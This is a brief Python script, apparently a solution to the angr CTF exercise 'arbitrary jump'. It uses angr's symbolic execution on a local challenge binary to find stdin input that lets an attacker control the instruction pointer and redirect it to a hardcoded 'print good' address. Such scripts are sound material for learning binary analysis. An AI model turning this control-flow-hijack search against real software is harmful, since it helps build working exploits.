import angr
import claripy

proj = angr.Project('../dist/17_angr_arbitrary_jump')
payload = claripy.BVS('payload', 64 * 8)
state = proj.factory.entry_state(stdin=payload)
simgr = proj.factory.simgr(
    state, 
    save_unconstrained=True, 
    stashes={
        'active':[state],
        'unconstrained': [],
        'found': [],
    })
while (len(simgr.active) or len(simgr.unconstrained)) and not len(simgr.found):
    for unconstrained in simgr.unconstrained:
        eip = unconstrained.regs.eip
        print_good_addr = 0x42585249
        if unconstrained.satisfiable(extra_constraints=[eip == print_good_addr]):
            unconstrained.add_constraints(eip == print_good_addr)
            simgr.move('unconstrained', 'found')
            break
    simgr.drop(stash="unconstrained")
    simgr.step()

print(simgr.found[0].posix.dumps(0))